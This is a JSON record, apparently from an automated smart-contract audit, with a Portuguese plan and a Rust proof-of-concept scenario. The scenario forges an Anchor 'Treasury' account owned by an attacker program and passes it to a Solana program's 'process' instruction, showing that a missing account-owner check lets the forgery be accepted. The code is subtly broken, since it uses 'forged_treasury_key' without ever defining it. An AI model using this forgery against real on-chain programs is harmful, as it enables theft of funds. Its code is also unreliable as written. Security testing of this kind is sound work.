{
  "plan": "Preparamos uma conta forjada de 'Treasury' com dono igual a um programa atacante (env.attacker_program) e dados que imitam o layout (authority, balance, is_active=true). O baseline usa a instrucao initialize para criar uma Treasury legitima com dono env.program_id, provando que o cenario esta correto. O ataque chama process passando a conta forjada como treasury, com a mesma authority signer. O efeito mede que a conta forjada foi aceita e usada: o ataque teve sucesso e a conta forjada permanece com dono diferente de env.program_id.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker_program = env.attacker_program.expect("attacker program required");

// Conta forjada: dono e o programa atacante, dados imitam Treasury (discriminador + authority + balance + is_active)
let mut forged_data = Vec::new();
forged_data.extend_from_slice(&anchor_account_discriminator("Treasury"));
forged_data.extend_from_slice(authority.as_ref());
forged_data.extend_from_slice(&1_000_000u64.to_le_bytes());
forged_data.push(1u8); // is_active = true
let forged_treasury = account(&attacker_program, &forged_data, None);

// Baseline: initialize cria uma Treasury legitima com dono env.program_id
let treasury_key = Pubkey::new_unique();
let (system_program_id, system_program_acc) = system_program_account();
let init_ix = env.anchor_ix(
    "initialize",
    &(500u64,),
    vec![
        AccountMeta::new(treasury_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let init_accounts = vec![
    (treasury_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    (system_program_id, system_program_acc),
];
let baseline_result = env.baseline("initialize legitimo", &init_ix, &init_accounts);
assert_eq!(baseline_result.program_result, ProgramResult::Success);

// Ataque: process com a conta forjada (dono = attacker_program)
let process_ix = env.anchor_ix(
    "process",
    &(),
    vec![
        AccountMeta::new_readonly(forged_treasury_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let process_accounts = vec![
    (forged_treasury_key, forged_treasury),
    (authority, wallet(1_000_000_000)),
];
let attack_result = env.attack("process com treasury forjada", &process_ix, &process_accounts);

if attack_result.program_result == ProgramResult::Success {
    let after_treasury = after(&attack_result, &forged_treasury_key);
    env.effect(
        "conta forjada aceita e usada: dono diferente do programa",
        after_treasury.owner() != &env.program_id && after_treasury.owner() == &attacker_program,
    );
}"
}

